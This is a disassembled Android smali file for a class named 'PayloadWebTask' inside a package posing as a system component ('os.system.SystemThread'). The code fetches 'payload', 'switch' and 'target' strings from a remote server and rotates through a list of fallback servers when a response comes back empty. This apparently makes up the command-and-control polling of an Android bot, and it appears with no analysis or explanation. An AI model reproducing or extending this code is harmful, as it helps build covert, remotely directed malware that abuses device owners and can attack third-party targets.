.class Los/system/SystemThread$PayloadWebTask;
.super Landroid/os/AsyncTask;
.source "SystemThread.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/SystemThread;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "PayloadWebTask"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field protected applicationContext:Landroid/content/Context;

.field protected paymain:Ljava/lang/String;

.field final synthetic this$0:Los/system/SystemThread;


# direct methods
.method private constructor <init>(Los/system/SystemThread;)V
    .locals 1

    .prologue
    .line 699
    iput-object p1, p0, Los/system/SystemThread$PayloadWebTask;->this$0:Los/system/SystemThread;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 702
    const-string v0, ""

    iput-object v0, p0, Los/system/SystemThread$PayloadWebTask;->paymain:Ljava/lang/String;

    return-void
.end method

.method synthetic constructor <init>(Los/system/SystemThread;Los/system/SystemThread$1;)V
    .locals 0

    .prologue
    .line 699
    invoke-direct {p0, p1}, Los/system/SystemThread$PayloadWebTask;-><init>(Los/system/SystemThread;)V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 699
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/SystemThread$PayloadWebTask;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    .prologue
    const v2, 0xc350

    .line 709
    const-string v0, ""

    .line 710
    new-instance v1, Lorg/apache/http/params/BasicHttpParams;

    invoke-direct {v1}, Lorg/apache/http/params/BasicHttpParams;-><init>()V

    .line 711
    invoke-static {v1, v2}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 712
    invoke-static {v1, v2}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 714
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2, v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V

    .line 715
    new-instance v1, Lorg/apache/http/client/methods/HttpGet;

    const/4 v3, 0x0

    aget-object v3, p1, v3

    invoke-direct {v1, v3}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 717
    :try_start_0
    invoke-interface {v2, v1}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 719
    :try_start_1
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v1

    .line 720
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 721
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 723
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 724
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 728
    :catch_0
    move-exception v1

    .line 729
    :try_start_2
    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v2, "Error split text"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 735
    :goto_1
    return-object v0

    .line 726
    :cond_0
    :try_start_3
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 727
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result-object v0

    goto :goto_1

    .line 732
    :catch_1
    move-exception v1

    .line 733
    sget-object v1, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v2, "payload Failed Connect to Server!"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 699
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/SystemThread$PayloadWebTask;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 741
    iget-object v0, p0, Los/system/SystemThread$PayloadWebTask;->paymain:Ljava/lang/String;

    const-string v1, "text"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 742
    sput-object p1, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    .line 761
    :cond_0
    :goto_0
    return-void

    .line 744
    :cond_1
    iget-object v0, p0, Los/system/SystemThread$PayloadWebTask;->paymain:Ljava/lang/String;

    const-string v1, "sw"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 745
    sput-object p1, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    .line 747
    const-string v0, ""

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 748
    sget-object v0, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v1, "sffffs"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 749
    sget v0, Los/system/SystemThread;->iserver:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Los/system/SystemThread;->iserver:I

    .line 750
    sget v0, Los/system/SystemThread;->iserver:I

    sget v1, Los/system/SystemThread;->jumserver:I

    if-ne v0, v1, :cond_2

    .line 752
    const/4 v0, 0x0

    sput v0, Los/system/SystemThread;->iserver:I

    .line 754
    :cond_2
    invoke-static {}, Los/system/SystemThread;->access$1500()[Ljava/lang/String;

    move-result-object v0

    sget v1, Los/system/SystemThread;->iserver:I

    aget-object v0, v0, v1

    sput-object v0, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    goto :goto_0

    .line 757
    :cond_3
    iget-object v0, p0, Los/system/SystemThread$PayloadWebTask;->paymain:Ljava/lang/String;

    const-string v1, "target"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 758
    sput-object p1, Los/system/SystemThread;->payloadWebResultTarget:Ljava/lang/String;

    goto :goto_0
.end method

.method protected onPreExecute()V
    .locals 0

    .prologue
    .line 705
    return-void
.end method
